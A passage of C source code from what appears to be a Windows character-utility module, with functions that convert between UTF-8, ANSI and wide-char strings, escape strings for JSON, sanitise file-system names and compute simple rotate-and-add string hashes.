                    if(pus[cbw + 1] < 0xD800 || pus[cbw + 1] > 0xDFFF) { goto fail; }    // fail: invalid code point
                    cbu += 2;
                    cbw++;
                } else {
                    cbu += 2;
                }
            } else if(c > 0x7f) {
                cbu++;
            }
            cbw++;
        }
    }
    cbw++;
    cbu += cbw;
    if(pcbu) { *pcbu = cbu; }
    // 2: return on length-request or alloc-fail
    if(!pusz) {
        if(!(flags & CHARUTIL_FLAG_STR_BUFONLY)) { return TRUE; }   // success: length request
        if(flags & CHARUTIL_FLAG_ALLOC) { return FALSE; }
    }
    if(!(flags & CHARUTIL_FLAG_ALLOC) && (!pbBuffer || (cbBuffer < cbu))) { goto fail; } // fail: insufficient buffer space
    usz = (pbBuffer && (cbBuffer >= cbu)) ? pbBuffer : LocalAlloc(0, cbu);
    if(!usz) { goto fail; }                                              // fail: failed buffer space allocation
    // 3: populate with utf-8 string
    i = cbw - 2; j = cbu - 2;
    while(i < 0x7fffffff) {
        c = pus[i--];
        if(c > 0x7ff) {
            if(c >= 0xD800 && c <= 0xDFFF) {
                // surrogate pair (previously validated in step 1)
                chSur = 0x10000 + (((pus[i--] - 0xD800) << 10) | ((c - 0xDC00) & 0x3ff));
                usz[j--] = 0x80 | (chSur & 0x3f);
                usz[j--] = 0x80 | ((chSur >> 6) & 0x3f);
                usz[j--] = 0x80 | ((chSur >> 12) & 0x3f);
                usz[j--] = 0xf0 | ((chSur >> 18) & 0x0f);
            } else {
                usz[j--] = 0x80 | (c & 0x3f);
                usz[j--] = 0x80 | ((c >> 6) & 0x3f);
                usz[j--] = 0xe0 | ((c >> 12) & 0x1f);
            }
        } else if(c > 0x7f) {
            usz[j--] = 0x80 | (c & 0x3f);
            usz[j--] = 0xc0 | ((c >> 6) & 0x3f);
        } else {
            usz[j--] = (CHAR)c;
        }
    }
    usz[cbu - 1] = 0;
    if(pusz) { *pusz = usz; }
    return TRUE;
fail:
    if(!(flags ^ CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR) && pbBuffer && cbBuffer) {
        if(pusz) { *pusz = (LPSTR)pbBuffer; }
        if(pcbu) { *pcbu = 1; }
        pbBuffer[0] = 0;
    }
    return FALSE;
}

/*
* Convert UTF-8 string into a Windows Wide-Char string.
* Function support usz == pbBuffer - usz will then become overwritten.
* CALLER LOCALFREE (if *pusz != pbBuffer): *pusz
* -- usz = the string to convert.
* -- cch = -1 for null-terminated string; or max number of chars (excl. null).
* -- pbBuffer = optional buffer to place the result in.
* -- cbBuffer
* -- pusz = if set to null: function calculate length only and return TRUE.
            result wide-string, either as (*pwsz == pbBuffer) or LocalAlloc'ed
*           buffer that caller is responsible for free.
* -- pcbu = byte length (including terminating null) of wide-char string.
* -- flags = CHARUTIL_FLAG_NONE, CHARUTIL_FLAG_ALLOC or CHARUTIL_FLAG_TRUNCATE
* -- return
*/
_Success_(return)
BOOL CharUtil_UtoW(_In_opt_ LPSTR usz, _In_ DWORD cch, _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer, _In_ DWORD cbBuffer, _Out_opt_ LPWSTR *pwsz, _Out_opt_ PDWORD pcbw, _In_ DWORD flags)
{
    UCHAR c;
    LPWSTR wsz;
    DWORD i, j, n, cbu = 0, cbw = 0, ch;
    BOOL fTruncate = flags & CHARUTIL_FLAG_TRUNCATE;
    if(pcbw) { *pcbw = 0; }
    if(pwsz) { *pwsz = NULL; }
    if(!usz) { usz = ""; }
    if(cch > CHARUTIL_CONVERT_MAXSIZE) { cch = CHARUTIL_CONVERT_MAXSIZE; }
    // 1: utf-8 byte-length:
    cbBuffer = cbBuffer & ~1;       // multiple of 2-byte sizeof(WCHAR)
    if(fTruncate && (!cbBuffer || (flags & CHARUTIL_FLAG_ALLOC))) { goto fail; }
    while((cbu < cch) && (c = usz[cbu])) {
        if(c & 0x80) {
            // utf-8 char:
            n = 0;
            if((c & 0xe0) == 0xc0) { n = 2; }
            if((c & 0xf0) == 0xe0) { n = 3; }
            if((c & 0xf8) == 0xf0) { n = 4; }
            if(!n) { goto fail; }                                           // invalid char-encoding
            if(cbu + n > cch) { break; }
            if(fTruncate && (cbw + ((n == 4) ? 4 : 2) >= cbBuffer)) { break; }
            if((n > 1) && ((usz[cbu + 1] & 0xc0) != 0x80)) { goto fail; }   // invalid char-encoding
            if((n > 2) && ((usz[cbu + 2] & 0xc0) != 0x80)) { goto fail; }   // invalid char-encoding
            if((n > 3) && ((usz[cbu + 3] & 0xc0) != 0x80)) { goto fail; }   // invalid char-encoding
            cbw += (n == 4) ? 4 : 2;
            cbu += n;
        } else {
            if(fTruncate && (cbw + 2 >= cbBuffer)) { break; }
            cbw += 2;
            cbu += 1;
        }
    }
    cbu += 1;
    cbw += 2;
    if(pcbw) { *pcbw = cbw; }
    // 2: return on length-request or alloc-fail
    if(!pwsz) {
        if(!(flags & CHARUTIL_FLAG_STR_BUFONLY)) { return TRUE; }   // success: length request
        if(flags & CHARUTIL_FLAG_ALLOC) { return FALSE; }
    }
    if(!(flags & CHARUTIL_FLAG_ALLOC) && (!pbBuffer || (cbBuffer < cbw))) { goto fail; } // fail: insufficient buffer space
    wsz = (pbBuffer && (cbBuffer >= cbw)) ? pbBuffer : LocalAlloc(0, cbw);
    if(!wsz) { goto fail; }                                                 // fail: failed buffer space allocation
    // 3: Populate with wchar string. NB! algorithm works only on correctly
    //    formed UTF-8 - which has been verified in the count-step.
    i = cbu - 2; j = (cbw >> 1) - 1;
    wsz[j--] = 0;
    while(i < 0x7fffffff) {
        if(((c = usz[i--]) & 0xc0) == 0x80) {
            // 2-3-4 byte utf-8
            ch = c & 0x3f;
            if(((c = usz[i--]) & 0xc0) == 0x80) {
                // 3-4 byte utf-8
                ch += (c & 0x3f) << 6;
                if(((c = usz[i--]) & 0xc0) == 0x80) {
                    ch += (c & 0x3f) << 12;     // 4-byte utf-8
                    c = usz[i--];
                    ch += (c & 0x07) << 18;
                } else {
                    ch += (c & 0x0f) << 12;     // 3-byte utf-8
                }
            } else {
                ch += (c & 0x1f) << 6;          // 2-byte utf-8
            }
            if(ch >= 0x10000) {
                // surrogate pair:
                ch -= 0x10000;
                wsz[j--] = (ch & 0x3ff) + 0xdc00;
                wsz[j--] = (USHORT)((ch >> 10) + 0xd800);
            } else {
                wsz[j--] = (USHORT)ch;
            }
        } else {
            wsz[j--] = c;
        }
    }
    if(pwsz) { *pwsz = wsz; }
    return TRUE;
fail:
    if(!(flags ^ CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR) && pbBuffer && (cbBuffer > 1)) {
        if(pwsz) { *pwsz = (LPWSTR)pbBuffer; }
        if(pcbw) { *pcbw = 2; }
        pbBuffer[0] = 0;
    }
    return FALSE;
}

_Success_(return)
BOOL CharUtil_WtoW(_In_opt_ LPWSTR wsz, _In_ DWORD cch, _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer, _In_ DWORD cbBuffer, _Out_opt_ LPWSTR *pwsz, _Out_opt_ PDWORD pcbw, _In_ DWORD flags)
{
    // NB!
    // This function is assumed to be rarely used. Due to this it's implemented
    // by calling CharUtil_WtoU and CharUtil_UtoW which is slightly ineffective.
    LPSTR usz;
    DWORD cbu;
    BYTE pbBufferInternal[MAX_PATH * 2];
    return
        CharUtil_WtoU(wsz, cch, pbBufferInternal, sizeof(pbBufferInternal), &usz, &cbu, CHARUTIL_FLAG_TRUNCATE) &&
        CharUtil_UtoW(usz, -1, pbBuffer, cbBuffer, pwsz, pcbw, flags);
}


VOID CharUtil_EscapeJSON2(_In_ CHAR ch, _Out_writes_(2) PCHAR chj)
{
    chj[0] = '\\';
    switch(ch) {
        case '"': chj[1] = '"'; break;
        case '\\': chj[1] = '\\'; break;
        case '\b': chj[1] = 'b'; break;
        case '\f': chj[1] = 'f'; break;
        case '\n': chj[1] = 'n'; break;
        case '\r': chj[1] = 'r'; break;
        case '\t': chj[1] = 't'; break;
    }
}

VOID CharUtil_EscapeJSON6(_In_ CHAR ch, _Out_writes_(6) PCHAR chj)
{
    CHAR chh;
    chj[0] = '\\';
    chj[1] = 'u';
    chj[2] = '0';
    chj[3] = '0';
    chh = (ch >> 4) & 0xf;
    chj[4] = (chh < 10) ? '0' + chh : 'a' - 10 + chh;
    chh = ch & 0xf;
    chj[5] = (chh < 10) ? '0' + chh : 'a' - 10 + chh;
}

/*
* Convert UTF-8, Ascii (0-255) or Wide (16-bit LE) string into a JSON string.
* Function support sz/usz/wsz == pbBuffer - sz/usz/wsz will then become overwritten.
* CALLER LOCALFREE (if *pjsz != pbBuffer): *pjsz
* -- sz/usz/wsz = the string to convert.
* -- cch = -1 for null-terminated string; or max number of chars (excl. null).
* -- pbBuffer = optional buffer to place the result in.
* -- cbBuffer
* -- pjsz = if set to null: function calculate length only and return TRUE.
            result utf-8 string, either as (*pjsz == pbBuffer) or LocalAlloc'ed
*           buffer that caller is responsible for free.
* -- pcbj = byte length (including terminating null) of utf-8 string.
* -- flags = CHARUTIL_FLAG_NONE, CHARUTIL_FLAG_ALLOC or CHARUTIL_FLAG_TRUNCATE
* -- return
*/
_Success_(return)
BOOL CharUtil_UtoJ(_In_opt_ LPSTR usz, _In_ DWORD cch, _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer, _In_ DWORD cbBuffer, _Out_opt_ LPSTR *pjsz, _Out_opt_ PDWORD pcbj, _In_ DWORD flags)
{
    UCHAR c;
    LPSTR jsz;
    DWORD i, j, n, cba = 0, cbj = 0;
    if(pcbj) { *pcbj = 0; }
    if(pjsz) { *pjsz = NULL; }
    if(!usz) { usz = ""; }
    if(cch > CHARUTIL_CONVERT_MAXSIZE) { cch = CHARUTIL_CONVERT_MAXSIZE; }
    // 1: ansi byte-length and if ansi-only
    if((flags & CHARUTIL_FLAG_TRUNCATE)) {
        if(!cbBuffer || (flags & CHARUTIL_FLAG_ALLOC)) { goto fail; }
        while((cba < cch) && (c = usz[cba])) {
            if(c < 0x20 || c == '"' || c == '\\') {
                // JSON encode
                n = (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
                if(cba + cbj + 1 + n >= cbBuffer) { break; }
                cbj += n;
            }
            cba++;
        }
    } else {
        while((cba < cch) && (c = usz[cba])) {
            if(c < 0x20 || c == '"' || c == '\\') {
                // JSON encode
                cbj += (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
            }
            cba++;
        }
    }
    cba++;
    cbj += cba;
    if(pcbj) { *pcbj = cbj; }
    // 2: return on length-request or alloc-fail
    if(!pjsz) {
        if(!(flags & CHARUTIL_FLAG_STR_BUFONLY)) { return TRUE; }   // success: length request
        if(flags & CHARUTIL_FLAG_ALLOC) { return FALSE; }
    }
    if(!cbj) { goto fail; }
    if(!(flags & CHARUTIL_FLAG_ALLOC) && (!pbBuffer || (cbBuffer < cbj))) { goto fail; } // fail: insufficient buffer space
    jsz = (pbBuffer && (cbBuffer >= cbj)) ? pbBuffer : LocalAlloc(0, cbj);
    if(!jsz) { goto fail; }                                              // fail: failed buffer space allocation
    // 3: populate with utf-8 string (backwards to support sz == pbBuffer case)
    i = cba - 2; j = cbj - 2;
    while(i < 0x7fffffff) {
        c = usz[i--];
        if(c < 0x20 || c == '"' || c == '\\') {
            // JSON encode
            n = (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
            if(n == 1) { CharUtil_EscapeJSON2(c, jsz + j - 1); }
            if(n == 5) { CharUtil_EscapeJSON6(c, jsz + j - 5); }
            j -= 1 + n;
        } else {
            jsz[j--] = c;
        }
    }
    jsz[cbj - 1] = 0;
    if(pjsz) { *pjsz = jsz; }
    return TRUE;
fail:
    if(!(flags ^ CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR) && pbBuffer && cbBuffer) {
        if(pjsz) { *pjsz = (LPSTR)pbBuffer; }
        if(pcbj) { *pcbj = 1; }
        pbBuffer[0] = 0;
    }
    return FALSE;
}

_Success_(return)
BOOL CharUtil_AtoJ(_In_opt_ LPSTR sz, _In_ DWORD cch, _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer, _In_ DWORD cbBuffer, _Out_opt_ LPSTR *pjsz, _Out_opt_ PDWORD pcbj, _In_ DWORD flags)
{
    UCHAR c;
    LPSTR jsz;
    DWORD i, j, n, cba = 0, cbj = 0;
    if(pcbj) { *pcbj = 0; }
    if(pjsz) { *pjsz = NULL; }
    if(!sz) { sz = ""; }
    if(cch > CHARUTIL_CONVERT_MAXSIZE) { cch = CHARUTIL_CONVERT_MAXSIZE; }
    // 1: ansi byte-length and if ansi-only
    if((flags & CHARUTIL_FLAG_TRUNCATE)) {
        if(!cbBuffer || (flags & CHARUTIL_FLAG_ALLOC)) { goto fail; }
        while((cba < cch) && (c = sz[cba])) {
            if(c > 0x7f) {
                if(cba + cbj + 1 + 1 >= cbBuffer) { break; }
                cbj++;
            } else if(c < 0x20 || c == '"' || c == '\\') {
                // JSON encode
                n = (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
                if(cba + cbj + 1 + n >= cbBuffer) { break; }
                cbj += n;
            } else {
                if(cba + cbj + 1 >= cbBuffer) { break; }
            }
            cba++;
        }
    } else {
        while((cba < cch) && (c = sz[cba])) {
            if(c > 0x7f) {
                cbj++;
            } else if(c < 0x20 || c == '"' || c == '\\') {
                // JSON encode
                cbj += (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
            }
            cba++;
        }
    }
    cba++;
    cbj += cba;
    if(pcbj) { *pcbj = cbj; }
    // 2: return on length-request or alloc-fail
    if(!pjsz) {
        if(!(flags & CHARUTIL_FLAG_STR_BUFONLY)) { return TRUE; }   // success: length request
        if(flags & CHARUTIL_FLAG_ALLOC) { return FALSE; }
    }
    if(!cbj) { goto fail; }
    if(!(flags & CHARUTIL_FLAG_ALLOC) && (!pbBuffer || (cbBuffer < cbj))) { goto fail; } // fail: insufficient buffer space
    jsz = (pbBuffer && (cbBuffer >= cbj)) ? pbBuffer : LocalAlloc(0, cbj);
    if(!jsz) { goto fail; }                                              // fail: failed buffer space allocation
    // 3: populate with utf-8 string (backwards to support sz == pbBuffer case)
    i = cba - 2; j = cbj - 2;
    while(i < 0x7fffffff) {
        c = sz[i--];
        if(c > 0x7f) {
            jsz[j--] = 0x80 | (c & 0x3f);
            jsz[j--] = 0xc0 | ((c >> 6) & 0x1f);
        } else if(c < 0x20 || c == '"' || c == '\\') {
            // JSON encode
            n = (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
            if(n == 1) { CharUtil_EscapeJSON2(c, jsz + j - 1); }
            if(n == 5) { CharUtil_EscapeJSON6(c, jsz + j - 5); }
            j -= 1 + n;
        } else {
            jsz[j--] = c;
        }
    }
    jsz[cbj - 1] = 0;
    if(pjsz) { *pjsz = jsz; }
    return TRUE;
fail:
    if(!(flags ^ CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR) && pbBuffer && cbBuffer) {
        if(pjsz) { *pjsz = (LPSTR)pbBuffer; }
        if(pcbj) { *pcbj = 1; }
        pbBuffer[0] = 0;
    }
    return FALSE;
}

_Success_(return)
BOOL CharUtil_WtoJ(_In_opt_ LPWSTR wsz, _In_ DWORD cch, _Maybenull_ _Writable_bytes_(cbBuffer) PBYTE pbBuffer, _In_ DWORD cbBuffer, _Out_opt_ LPSTR *pjsz, _Out_opt_ PDWORD pcbj, _In_ DWORD flags)
{
    USHORT c, cZERO = 0;
    LPSTR jsz;
    PUSHORT pus;
    DWORD i, j, n, cbw = 0, cbj = 0, chSur;
    if(pcbj) { *pcbj = 0; }
    if(pjsz) { *pjsz = NULL; }
    if(cch > CHARUTIL_CONVERT_MAXSIZE) { cch = CHARUTIL_CONVERT_MAXSIZE; }
    pus = wsz ? (PUSHORT)wsz : &cZERO;
    // 1: ansi byte-length and if ansi-only
    if((flags & CHARUTIL_FLAG_TRUNCATE)) {
        if(!cbBuffer || (flags & CHARUTIL_FLAG_ALLOC)) { goto fail; }
        while((cbw < cch) && (c = pus[cbw])) {
            if(c > 0x7ff) {
                if(c >= 0xD800 && c <= 0xDFFF) {
                    // surrogate pair
                    if(cbw + cbj + 1 + 2 + 1 >= cbBuffer) { break; }
                    if(cbw + 1 >= cch) { break; }    // end of string
                    if(pus[cbw + 1] < 0xD800 || pus[cbw + 1] > 0xDFFF) { goto fail; }    // fail: invalid code point
                    cbj += 2;
                    cbw++;
                } else {
                    if(cbw + cbj + 1 + 2 >= cbBuffer) { break; }
                    cbj += 2;
                }
            } else if(c > 0x7f) {
                if(cbw + cbj + 1 + 1 >= cbBuffer) { break; }
                cbj++;
            } else if(c < 0x20 || c == '"' || c == '\\') {
                // JSON encode
                n = (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
                if(cbw + cbj + 1 + n >= cbBuffer) { break; }
                cbj += n;
            } else {
                if(cbw + cbj + 1 >= cbBuffer) { break; }
            }
            cbw++;
        }
    } else {
        while((cbw < cch) && (c = pus[cbw])) {
            if(c > 0x7ff) {
                if(c >= 0xD800 && c <= 0xDFFF) {
                    // surrogate pair
                    if(cbw + 1 >= cch) { break; }    // end of string
                    if(pus[cbw + 1] < 0xD800 || pus[cbw + 1] > 0xDFFF) { goto fail; }   // fail: invalid code point
                    cbj += 2;
                    cbw++;
                } else {
                    cbj += 2;
                }
            } else if(c > 0x7f) {
                cbj++;
            } else if(c < 0x20 || c == '"' || c == '\\') {
                // JSON encode
                cbj += (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
            }
            cbw++;
        }
    }
    cbw++;
    cbj += cbw;
    if(pcbj) { *pcbj = cbj; }
    // 2: return on length-request or alloc-fail
    if(!pjsz) {
        if(!(flags & CHARUTIL_FLAG_STR_BUFONLY)) { return TRUE; }   // success: length request
        if(flags & CHARUTIL_FLAG_ALLOC) { return FALSE; }
    }
    if(!cbj) { goto fail; }
    if(!(flags & CHARUTIL_FLAG_ALLOC) && (!pbBuffer || (cbBuffer < cbj))) { goto fail; } // fail: insufficient buffer space
    jsz = (pbBuffer && (cbBuffer >= cbj)) ? pbBuffer : LocalAlloc(0, cbj);
    if(!jsz) { goto fail; }                                                 // fail: failed buffer space allocation
    // 3: populate with utf-8 string (backwards to support sz == pbBuffer case)
    i = cbw - 2; j = cbj - 2;
    while(i < 0x7fffffff) {
        c = pus[i--];
        if(c > 0x7ff) {
            if(c >= 0xD800 && c <= 0xDFFF) {
                // surrogate pair (previously validated in step 1)
                chSur = 0x10000 + (((pus[i--] - 0xD800) << 10) | ((c - 0xDC00) & 0x3ff));
                jsz[j--] = 0x80 | (chSur & 0x3f);
                jsz[j--] = 0x80 | ((chSur >> 6) & 0x3f);
                jsz[j--] = 0x80 | ((chSur >> 12) & 0x3f);
                jsz[j--] = 0xf0 | ((chSur >> 18) & 0x0f);
            } else {
                jsz[j--] = 0x80 | (c & 0x3f);
                jsz[j--] = 0x80 | ((c >> 6) & 0x3f);
                jsz[j--] = 0xe0 | ((c >> 12) & 0x1f);
            }
        } else if(c > 0x7f) {
            jsz[j--] = 0x80 | (c & 0x3f);
            jsz[j--] = 0xc0 | ((c >> 6) & 0x3f);
        } else if(c < 0x20 || c == '"' || c == '\\') {
            // JSON encode
            n = (c == '"' || c == '\\' || c == '\b' || c == '\f' || c == '\n' || c == '\r' || c == '\t') ? 1 : 5;
            if(n == 1) { CharUtil_EscapeJSON2((CHAR)c, jsz + j - 1); } 
            if(n == 5) { CharUtil_EscapeJSON6((CHAR)c, jsz + j - 5); }
            j -= 1 + n;
        } else {
            jsz[j--] = (CHAR)c;
        }
    }
    jsz[cbj - 1] = 0;
    if(pjsz) { *pjsz = jsz; }
    return TRUE;
fail:
    if(!(flags ^ CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR) && pbBuffer && cbBuffer) {
        if(pjsz) { *pjsz = (LPSTR)pbBuffer; }
        if(pcbj) { *pcbj = 1; }
        pbBuffer[0] = 0;
    }
    return FALSE;
}




/*
* Convert a string into a file name compatible string by replacing illegal
* characters with '_'. Also optionally add a suffix between 1-9 and fix
* upper-case letters. If insufficient space the result will be truncated.
* -- uszDst
* -- cbuDst
* -- uszSrc
* -- iSuffix
* -- fUpper
* -- return = number of bytes written (including terminating NULL).
*/
_Success_(return != 0)
DWORD CharUtil_FixFsNameU(_Out_writes_(cbuDst) LPSTR uszDst, _In_ DWORD cbuDst, _In_ LPCSTR uszSrc, _In_opt_ DWORD iSuffix, _In_ BOOL fUpper)
{
    UCHAR c;
    DWORD i = 0, nSuffix = 0;
    // 1: convert correct size utf-8
    if(iSuffix) {
        if(iSuffix < 100) { nSuffix = 3; }
        if(iSuffix < 10) { nSuffix = 2; }
    }
    if(cbuDst < 2 + nSuffix) {
        if(cbuDst) { uszDst[0] = 0; }
        return cbuDst ? 1 : 0;
    }
    CharUtil_UtoU((LPSTR)uszSrc, -1, (PBYTE)uszDst, cbuDst - nSuffix, NULL, NULL, CHARUTIL_FLAG_TRUNCATE | CHARUTIL_FLAG_STR_BUFONLY);
    // 2: replace bad/uppercase chars
    if(fUpper) {
        while((c = uszDst[i])) {
            if(c >= 'a' && c <= 'z') {
                c += 'A' - 'a';
            } else if(c < 128) {
                c = (CHARUTIL_ANSIFILENAME_ALLOW[c] == '0') ? '_' : c;
            }
            uszDst[i] = c;
            i++;
        }
    } else {
        while((c = uszDst[i])) {
            if(c < 128) {
                c = (CHARUTIL_ANSIFILENAME_ALLOW[c] == '0') ? '_' : c;
            }
            uszDst[i] = c;
            i++;
        }
    }
    // 3: append suffix (if required)
    if(nSuffix && (i + nSuffix + 1 < cbuDst)) {
        uszDst[i++] = '-';
        if(iSuffix >= 10) {
            uszDst[i++] = '0' + (CHAR)(iSuffix / 10);
        }
        uszDst[i++] = '0' + (CHAR)(iSuffix % 10);
        uszDst[i++] = 0;
    }
    if(i && (uszDst[i - 1] == '.')) { uszDst[i - 1] = '_'; }
    return (DWORD)(strlen(uszDst) + 1);
}

/*
* Convert a string into a file name compatible string by replacing illegal
* characters with '_'. Also optionally add a suffix between 1-9 and fix
* upper-case letters. One of [usz, sz, wsz] must be valid.
* -- uszOut
* -- usz
* -- sz
* -- wsz
* -- cwsz
* -- cch = number of bytes/wchars in usz/sz/wsz or _TRUNCATE
* -- iSuffix
* -- fUpper
* -- return = number of bytes written (including terminating NULL).
*/
_Success_(return != 0)
DWORD CharUtil_FixFsName(_Out_writes_(2*MAX_PATH) LPSTR uszOut, _In_opt_ LPCSTR usz, _In_opt_ LPCSTR sz, _In_opt_ LPCWSTR wsz, _In_ DWORD cch, _In_opt_ DWORD iSuffix, _In_ BOOL fUpper)
{
    UCHAR c;
    DWORD i = 0;
    LPSTR uszTMP;
    uszOut[0] = 0;
    // 1: convert correct size utf-8
    if(!sz && !usz && !wsz) { return 0; }
    if(sz && !CharUtil_AtoU((LPSTR)sz, cch, (PBYTE)uszOut, 2 * MAX_PATH - 3, &uszTMP, NULL, CHARUTIL_FLAG_TRUNCATE)) { return 0; }
    if(wsz && !CharUtil_WtoU((LPWSTR)wsz, cch, (PBYTE)uszOut, 2 * MAX_PATH - 3, &uszTMP, NULL, CHARUTIL_FLAG_TRUNCATE)) { return 0; }
    if(usz && !CharUtil_UtoU((LPSTR)usz, cch, (PBYTE)uszOut, 2 * MAX_PATH - 3, &uszTMP, NULL, CHARUTIL_FLAG_TRUNCATE)) { return 0; }
    // 2: replace bad/uppercase chars
    if(fUpper) {
        while((c = uszOut[i])) {
            if(c >= 'a' && c <= 'z') {
                c += 'A' - 'a';
            } else if(c < 128) {
                c = (CHARUTIL_ANSIFILENAME_ALLOW[c] == '0') ? '_' : c;
            }
            uszOut[i] = c;
            i++;
        }
    } else {
        while((c = uszOut[i])) {
            if(c < 128) {
                c = (CHARUTIL_ANSIFILENAME_ALLOW[c] == '0') ? '_' : c;
            }
            uszOut[i] = c;
            i++;
        }
    }
    // 3: append suffix (if required)
    if(iSuffix && (iSuffix < 100)) {
        uszOut[i++] = '-';
        if(iSuffix >= 10) {
            uszOut[i++] = '0' + (CHAR)(iSuffix / 10);
        }
        uszOut[i++] = '0' + (CHAR)(iSuffix % 10);
        uszOut[i++] = 0;
    }
    if(i && (uszOut[i - 1] == '.')) { uszOut[i - 1] = '_'; }
    return (DWORD)(strlen(uszOut) + 1);
}

/*
* Hash a string quickly using the ROT13 algorithm.
* -- sz/jsz/wsz = the string to hash
* -- fUpper
* -- return
*/
QWORD CharUtil_Hash64U(_In_ LPCSTR usz, _In_ BOOL fUpper)
{
    CHAR c;
    QWORD i = 0, qwHash = 0;
    if(fUpper) {
        while(TRUE) {
            c = usz[i++];
            if(!c) { return qwHash; }
            if(c >= 'a' && c <= 'z') {
                c += 'A' - 'a';
            }
            qwHash = ((qwHash >> 13) | (qwHash << 51)) + c;
        }
    } else {
        while(TRUE) {
            c = usz[i++];
            if(!c) { return qwHash; }
            qwHash = ((qwHash >> 13) | (qwHash << 51)) + c;
        }
    }
}

QWORD CharUtil_Hash64A(_In_ LPCSTR sz, _In_ BOOL fUpper)
{
    LPSTR usz;
    QWORD qwHash = 0;
    BYTE pbBuffer[MAX_PATH];
    if(CharUtil_IsAnsiA(sz)) {
        return CharUtil_Hash64U(sz, fUpper);
    }
    if(CharUtil_AtoU((LPSTR)sz, -1, pbBuffer, sizeof(pbBuffer), &usz, NULL, CHARUTIL_FLAG_ALLOC)) {
        qwHash = CharUtil_Hash64U(usz, fUpper);
        if(pbBuffer != (PBYTE)usz) { LocalFree(usz); }
    }
    return qwHash;
}

QWORD CharUtil_Hash64W(_In_ LPCWSTR wsz, _In_ BOOL fUpper)
{
    CHAR c;
    LPSTR usz;
    QWORD i = 0, qwHash = 0;
    BYTE pbBuffer[MAX_PATH];
    PUSHORT pus = (PUSHORT)wsz;
    if(CharUtil_IsAnsiW(wsz)) {
        while(TRUE) {
            c = (CHAR)pus[i++];
            if(!c) { return qwHash; }
            if(fUpper && c >= 'a' && c <= 'z') {
                c += 'A' - 'a';
            }
            qwHash = ((qwHash >> 13) | (qwHash << 51)) + c;
        }
    }
    if(CharUtil_WtoU((LPWSTR)wsz, -1, pbBuffer, sizeof(pbBuffer), &usz, NULL, CHARUTIL_FLAG_ALLOC)) {
        qwHash = CharUtil_Hash64U(usz, fUpper);
        if(pbBuffer != (PBYTE)usz) { LocalFree(usz); }
    }
    return qwHash;
}

DWORD CharUtil_Hash32U(_In_ LPCSTR usz, _In_ BOOL fUpper)
{
    CHAR c;
    DWORD i = 0, dwHash = 0;
    if(fUpper) {
        while(TRUE) {
            c = usz[i++];
            if(!c) { return dwHash; }
            if(c >= 'a' && c <= 'z') {
                c += 'A' - 'a';
            }
            dwHash = ((dwHash >> 13) | (dwHash << 19)) + c;
        }
    } else {
        while(TRUE) {
            c = usz[i++];
            if(!c) { return dwHash; }
            dwHash = ((dwHash >> 13) | (dwHash << 19)) + c;
        }
    }
}

DWORD CharUtil_Hash32A(_In_ LPCSTR sz, _In_ BOOL fUpper)
{
    LPSTR usz;
    DWORD dwHash = 0;
    BYTE pbBuffer[MAX_PATH];
    if(CharUtil_IsAnsiA(sz)) {
        return CharUtil_Hash32U(sz, fUpper);
    }
    if(CharUtil_AtoU((LPSTR)sz, -1, pbBuffer, sizeof(pbBuffer), &usz, NULL, CHARUTIL_FLAG_ALLOC)) {
        dwHash = CharUtil_Hash32U(usz, fUpper);
        if(pbBuffer != (PBYTE)usz) { LocalFree(usz); }
    }
    return dwHash;
}

DWORD CharUtil_Hash32W(_In_ LPCWSTR wsz, _In_ BOOL fUpper)
{
    CHAR c;
    LPSTR usz;
    DWORD i = 0, dwHash = 0;
    BYTE pbBuffer[MAX_PATH];
    PUSHORT pus = (PUSHORT)wsz;
    if(CharUtil_IsAnsiW(wsz)) {
        while(TRUE) {
            c = (CHAR)pus[i++];
            if(!c) { return dwHash; }
            if(fUpper && c >= 'a' && c <= 'z') {
                c += 'A' - 'a';
            }
            dwHash = ((dwHash >> 13) | (dwHash << 19)) + c;
        }
    }
    if(CharUtil_WtoU((LPWSTR)wsz, -1, pbBuffer, sizeof(pbBuffer), &usz, NULL, CHARUTIL_FLAG_ALLOC)) {
        dwHash = CharUtil_Hash32U(usz, fUpper);
        if(pbBuffer != (PBYTE)usz) { LocalFree(usz); }
    }
    return dwHash;
}




/*
* Internal hash function for HashNameFs* and HashPathFs* functions.
*/
DWORD CharUtil_Internal_HashFs(_In_ LPSTR usz)
{
    UCHAR c;
    DWORD i = 0, dwHash = 0;
    while((c = usz[i++])) {
        dwHash = ((dwHash >> 13) | (dwHash << 19)) + c;
    }
    return dwHash;
}

/*
* Hash a name string in a way that is supported by the file system.
* NB! this is not the same hash as the Windows registry uses.
* -- usz/sz/wsz
* -- iSuffix
* -- return
*/
DWORD CharUtil_HashNameFsU(_In_ LPCSTR usz, _In_opt_ DWORD iSuffix)
{
    CHAR uszFs[2*MAX_PATH];
    if(!CharUtil_FixFsName(uszFs, usz, NULL, NULL, -1, iSuffix, TRUE)) { return 0; }
    return CharUtil_Internal_HashFs(uszFs);
}

DWORD CharUtil_HashNameFsA(_In_ LPCSTR sz, _In_opt_ DWORD iSuffix)
{
    CHAR uszFs[2 * MAX_PATH];
    if(!CharUtil_FixFsName(uszFs, NULL, sz, NULL, -1, iSuffix, TRUE)) { return 0; }
    return CharUtil_Internal_HashFs(uszFs);
}

